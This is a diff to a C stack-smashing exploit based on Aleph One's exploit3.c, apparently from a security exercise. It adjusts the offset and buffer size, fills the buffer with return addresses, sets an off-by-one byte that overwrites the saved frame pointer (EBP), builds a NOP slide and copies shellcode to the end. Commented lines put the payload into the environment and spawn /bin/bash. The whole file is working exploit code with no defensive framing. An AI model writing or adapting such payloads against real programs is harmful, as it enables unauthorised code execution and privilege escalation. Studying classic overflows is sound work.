@@ -1,12 +1,12 @@
 /*
-*  Aleph's shellcode
-* use default 198 since it will overwrite first few with "EGG= "
+*  Aleph's shellcode with some more edits
+*  Based on exploit3.c from http://insecure.org/stf/smashstack.html
 */
 
 #include <stdlib.h>
 
-#define DEFAULT_OFFSET                    0
-#define DEFAULT_BUFFER_SIZE             500
+#define DEFAULT_OFFSET                 -176
+#define DEFAULT_BUFFER_SIZE            501
 #define NOP                            0x90
 
 char shellcode[] =
@@ -32,27 +32,30 @@ void main(int argc, char *argv[]) {
     exit(0);
   }
 
-  addr = get_sp() + 193 - offset;
+  addr = get_sp() - offset;
   // printf("Using address: 0x%x\n", addr);
 
   ptr = buff;
-  addr_ptr = (long *) ptr;
-  //fill with addrs
-  for (i = 0; i < 192; i+=4)
+  addr_ptr = (long *) ptr; //fill our address in like before
+  for (i = 0; i < bsize; i+=4)
     *(addr_ptr++) = addr;
 
-  buff[192] = 0x00; //overwriter
+  //but what's this? this is our overwrite byte for EBP!
+  buff[192] = 0x04;
 
-  //make a bunch of nops
-  for (i = 193; i < 293; i++)
+  //now we make our slide
+  for (i = 193; i < bsize; i++)
     buff[i] = NOP;
 
+  //into our shellcode at the end (minus one because null byte)
+  ptr = buff + ( bsize - (strlen(shellcode)) - 1 );
   for (i = 0; i < strlen(shellcode); i++)
-    buff[293 + i] = shellcode[i];
+    *(ptr++) = shellcode[i];
 
-  //buff[bsize - 1] = '\0';
-  printf(buff);
+  buff[bsize - 1] = '\0'; //you make my math more annoying :(
 
+  printf(buff); //vomit it into the terminal
+  
   // memcpy(buff,"EGG=",4);
   // putenv(buff);
   // system("/bin/bash");
